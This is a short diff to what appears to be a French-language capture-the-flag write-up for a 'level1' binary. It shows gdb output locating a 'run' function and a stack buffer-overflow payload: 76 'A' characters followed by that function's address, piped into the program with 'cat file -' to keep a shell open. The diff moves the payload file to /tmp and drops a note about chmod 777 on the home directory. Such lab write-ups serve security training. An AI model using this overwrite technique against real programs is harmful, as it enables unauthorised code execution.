@@ -21,12 +21,11 @@ Breakpoint 1 at 0x8048483
 $1 = {<text variable, no debug info>} 0x8048444 <run>
 
 Preparation :
-(attention il faut chmod 777 notre home avant: chmod 777 /home/user/level1/ )
 
-python -c 'print "A"*76 + "\x44\x84\x04\x08"' > file
+python -c 'print "A"*76 + "\x44\x84\x04\x08"' > /tmp/level1
 
 Execution : 
-cat file - | ./level1
+cat /tmp/level1 - | ./level1
 
 (on specifie - pour lire sur lentree standard apres avoir output le contenu de file.)
 
